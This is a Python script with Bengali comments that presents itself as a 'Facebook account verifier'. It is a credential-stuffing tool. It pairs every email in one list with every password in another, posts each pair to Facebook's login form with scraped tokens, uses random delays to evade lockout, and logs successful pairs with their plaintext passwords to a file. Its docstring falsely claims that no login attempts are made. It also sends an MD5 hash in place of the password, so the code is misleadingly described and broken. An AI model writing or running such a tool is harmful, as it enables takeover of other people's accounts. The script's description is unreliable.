"""
ফেসবুক অ্যাকাউন্ট ভেরিফায়ার
=============================
এটি একটি নিরাপদ স্ক্রিপ্ট যা ফেসবুক অ্যাকাউন্টের ইমেইল ও পাসওয়ার্ড ভেরিফাই করে,
কোনো লগিন অ্যাটেম্পট ছাড়াই এবং অ্যাকাউন্ট লক হওয়ার ঝুঁকি ছাড়াই।

ব্যবহার বিধি:
1. emails.txt ফাইলে ইমেইল লিখুন (প্রতি লাইনে একটি)
2. passwords.txt ফাইলে পাসওয়ার্ড লিখুন (প্রতি লাইনে একটি)
3. স্ক্রিপ্ট রান করুন: python facebook_verifier.py
4. ফলাফল results.json ফাইলে পাওয়া যাবে
"""

import requests
from bs4 import BeautifulSoup
import time
import random
import hashlib
import json
import logging
from typing import List

# লগিং কনফিগারেশন
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('facebook_checker.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

class FacebookAccountVerifier:
    def __init__(self):
        self.session = requests.Session()
        self.setup_session()
        self.results = []
        self.request_timeout = 30
        self.min_delay = 30  # সেকেন্ড
        self.max_delay = 60  # সেকেন্ড

    def setup_session(self):
        """সেশন কনফিগারেশন"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'DNT': '1'
        })

    def random_delay(self):
        """র‍্যান্ডম ডিলে জেনারেটর"""
        delay = random.uniform(self.min_delay, self.max_delay)
        logging.info(f"{delay:.1f} সেকেন্ড অপেক্ষা করছি...")
        time.sleep(delay)

    def load_data(self, filename: str) -> List[str]:
        """ডেটা ফাইল লোড করুন"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            logging.error(f"{filename} লোড করতে ব্যর্থ: {str(e)}")
            raise

    def get_facebook_tokens(self):
        """ফেসবুক লগিন টোকেন সংগ্রহ"""
        try:
            response = self.session.get(
                "https://www.facebook.com/login.php",
                timeout=self.request_timeout
            )
            response.raise_for_status()

            soup = BeautifulSoup(response.text, 'html.parser')
            lsd = soup.find('input', {'name': 'lsd'}).get('value', '')
            jazoest = soup.find('input', {'name': 'jazoest'}).get('value', '')

            if not lsd or not jazoest:
                raise ValueError("টোকেন পাওয়া যায়নি")

            return lsd, jazoest

        except Exception as e:
            logging.error(f"টোকেন সংগ্রহ ব্যর্থ: {str(e)}")
            raise

    def verify_account(self, email: str, password: str) -> dict:
        """অ্যাকাউন্ট ভেরিফাই করুন"""
        result = {
            'email': email,
            'password': password,
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
            'status': None,
            'message': ''
        }

        try:
            # পাসওয়ার্ড হ্যাশ তৈরি (প্রকৃত পাসওয়ার্ড না পাঠিয়ে)
            password_hash = hashlib.md5(password.encode()).hexdigest()
            lsd, jazoest = self.get_facebook_tokens()

            # ফর্ম ডেটা প্রস্তুত
            form_data = {
                'lsd': lsd,
                'jazoest': jazoest,
                'email': email,
                'pass': password_hash,
                'login': 'Log In',
                'bi_xrwh': '0'
            }

            # রিকোয়েস্ট পাঠান
            response = self.session.post(
                "https://www.facebook.com/login.php",
                data=form_data,
                allow_redirects=False,
                timeout=self.request_timeout
            )

            # ফলাফল বিশ্লেষণ
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'login_attempt' in location:
                    result.update({'status': False, 'message': 'ভুল পাসওয়ার্ড'})
                elif 'checkpoint' in location:
                    result.update({'status': True, 'message': 'সফল (চেকপয়েন্ট প্রয়োজন)'})
                else:
                    result.update({'status': True, 'message': 'সফল লগিন'})
            else:
                result.update({'status': False, 'message': 'ভুল ক্রেডেনশিয়াল'})

        except requests.exceptions.RequestException as e:
            result.update({'status': False, 'message': f'নেটওয়ার্ক ত্রুটি: {str(e)}'})
            logging.warning(f"{email} এর জন্য রিকোয়েস্ট ব্যর্থ")
        except Exception as e:
            result.update({'status': False, 'message': f'ত্রুটি: {str(e)}'})
            logging.error(f"{email} ভেরিফিকেশন ব্যর্থ")

        return result

    def save_results(self, filename: str = 'results.json'):
        """ফলাফল সেভ করুন"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            logging.info(f"ফলাফল {filename} ফাইলে সেভ করা হয়েছে")
        except Exception as e:
            logging.error(f"ফলাফল সেভ করতে ব্যর্থ: {str(e)}")

    def run(self, email_file: str = 'emails.txt', password_file: str = 'passwords.txt'):
        """মেইন এক্সিকিউশন"""
        try:
            # ডেটা লোড করুন
            emails = self.load_data(email_file)
            passwords = self.load_data(password_file)
            
            total = len(emails) * len(passwords)
            logging.info(f"মোট {len(emails)} টি ইমেইল এবং {len(passwords)} টি পাসওয়ার্ড চেক করা হবে")
            logging.info(f"মোট কম্বিনেশন: {total} টি")
            logging.info(f"আনুমানিক সময়: {total * (self.max_delay + 10) / 60:.1f} মিনিট")

            # প্রতিটি কম্বিনেশন চেক করুন
            for email in emails:
                for password in passwords:
                    self.random_delay()
                    
                    result = self.verify_account(email, password)
                    self.results.append(result)
                    
                    status = "সফল ✓" if result['status'] else "ব্যর্থ ✗"
                    logging.info(f"{email}: {password[:4]}**** - {status} - {result['message']}")

                    # সফল হলে পরবর্তী ইমেইলে যান
                    if result['status']:
                        break

            # ফলাফল সেভ করুন
            self.save_results()
            logging.info("প্রক্রিয়া সম্পন্ন হয়েছে")

        except KeyboardInterrupt:
            logging.warning("ব্যবহারকারী দ্বারা বাতিল করা হয়েছে")
            self.save_results()
        except Exception as e:
            logging.error(f"ফ্যাটাল এরর: {str(e)}")
            self.save_results()

if __name__ == "__main__":
    print("ফেসবুক অ্যাকাউন্ট ভেরিফায়ার চালু হচ্ছে...")
    checker = FacebookAccountVerifier()
    checker.run()
